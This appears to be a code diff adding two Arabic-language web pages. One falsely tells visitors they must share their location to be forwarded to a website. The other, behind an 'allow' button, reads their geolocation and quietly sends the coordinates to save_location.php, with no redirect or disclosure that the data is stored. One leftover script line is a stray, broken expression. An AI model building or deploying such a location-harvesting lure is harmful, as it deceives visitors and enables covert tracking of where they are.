@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>صفحة التحميل</title>
+</head>
+<body>
+  <div class="container">
+    <div class="center">
+      <img src="https://example.com/logo.png" alt="شعار الموقع - مثال" />
+      <img src="https://example.com/site-image.jpg" alt="صورة الموقع - مثال" />
+      <h1>عذراً، يلزمك السماح بموقعك لنقلك إلى موقع الويب</h1>
+      <p>إذا سمحت بموقعك، فسنتمكن من تقديم تجربة أفضل لك، مثل:</p>
+      <ul>
+        <li>عرض موقعك الحالي على الخريطة</li>
+        <li>تقديم توصيات محلية لك</li>
+        <li>تحسين دقة نتائج البحث</li>
+      </ul>
+      <div class="loading">
+        <img src="https://example.com/loading.gif" alt="تحميل" />
+      </div>
+    </div>
+  </div>
+</body>
+</html>
+
+
+<!DOCTYPE html>
+<html>
+<body>
+<h1>للأنتقال لصفحة الويب </h1>
+<p>أضغط على الزر للسماح بالموقع </p>
+
+<button onclick="getLocation()">سماح </button>
+
+<p id="demo"></p>
+
+<script>
+const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+
+  const xhttp = new XMLHttpRequest();
+  xhttp.open("GET", "save_location.php?lat=" + position.coords.latitude + "&long=" +position.coords.longitude);
+xhttp.send();
+"<br>Longitude: " + position.coords.longitude;
+}
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
